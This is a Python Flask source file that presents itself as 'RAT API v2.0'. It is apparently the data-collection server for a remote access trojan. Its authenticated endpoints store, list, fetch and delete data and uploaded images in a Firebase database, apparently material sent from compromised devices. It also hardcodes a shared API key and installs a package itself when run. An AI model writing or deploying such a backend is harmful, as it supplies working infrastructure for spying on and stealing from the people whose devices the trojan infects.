import subprocess
import sys

try:
    import firebase_admin
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "firebase-admin"])
    import firebase_admin

from flask import Flask, request, jsonify
from firebase_admin import credentials, db
from datetime import datetime
import os
import json
import base64

app = Flask(__name__)

service_account_json = os.environ.get('FIREBASE_SERVICE_ACCOUNT')
if not service_account_json:
    raise ValueError("FIREBASE_SERVICE_ACCOUNT not set!")

cred = credentials.Certificate(json.loads(service_account_json))
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://videohostvip-default-rtdb.firebaseio.com'
})

API_KEY = "SUMIT-XXX-2010-RAT"

def require_auth(f):
    def wrapper(*args, **kwargs):
        key = request.headers.get('X-API-Key', '')
        auth = request.headers.get('Authorization', '')
        if key == API_KEY:
            return f(*args, **kwargs)
        if auth.startswith('Bearer ') and auth[7:] == API_KEY:
            return f(*args, **kwargs)
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
    wrapper.__name__ = f.__name__
    return wrapper

# ========== HOME ==========
@app.route('/')
def home():
    return jsonify({"api": "RAT API v2.0", "status": "online"})

# ========== LIST ALL FOLDERS ==========
@app.route('/listrat', methods=['GET'])
@require_auth
def list_folders():
    ref = db.reference('/')
    data = ref.get()
    folders = list(data.keys()) if data else []
    return jsonify({"status": "success", "folders": folders, "count": len(folders)})

# ========== GET DATA ==========
@app.route('/<folder>', methods=['GET'])
@require_auth
def get_data(folder):
    ref = db.reference(f'/{folder}')
    data = ref.get()
    return jsonify({"status": "success", "data": data if data else {}, "count": len(data) if data else 0})

# ========== SEND DATA ==========
@app.route('/<folder>', methods=['POST'])
@require_auth
def send_data(folder):
    body = request.get_json()
    if not body:
        return jsonify({"status": "error", "message": "No data"}), 400
    ref = db.reference(f'/{folder}')
    new = ref.push(body)
    return jsonify({"status": "success", "key": new.key}), 201

# ========== DELETE FOLDER ==========
@app.route('/<folder>', methods=['DELETE'])
@require_auth
def delete_folder(folder):
    db.reference(f'/{folder}').delete()
    return jsonify({"status": "success", "message": f"{folder} deleted"})

# ========== DELETE ITEM ==========
@app.route('/<folder>/<item>', methods=['DELETE'])
@require_auth
def delete_item(folder, item):
    db.reference(f'/{folder}/{item}').delete()
    return jsonify({"status": "success", "message": f"{item} deleted"})

# ========== IMAGE UPLOAD ==========
@app.route('/<folder>/image', methods=['POST'])
@require_auth
def upload_image(folder):
    body = request.get_json()
    if not body or 'image' not in body or 'name' not in body:
        return jsonify({"status": "error", "message": "Need 'name' and 'image' fields"}), 400
    
    ref = db.reference(f'/{folder}/images')
    new = ref.push({
        "name": body['name'],
        "image": body['image'],
        "time": str(datetime.now())
    })
    return jsonify({"status": "success", "key": new.key}), 201

# ========== GET IMAGES ==========
@app.route('/<folder>/image', methods=['GET'])
@require_auth
def get_images(folder):
    ref = db.reference(f'/{folder}/images')
    data = ref.get()
    return jsonify({"status": "success", "images": data if data else {}, "count": len(data) if data else 0})

# ========== HEALTH ==========
@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "healthy", "time": str(datetime.now())})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
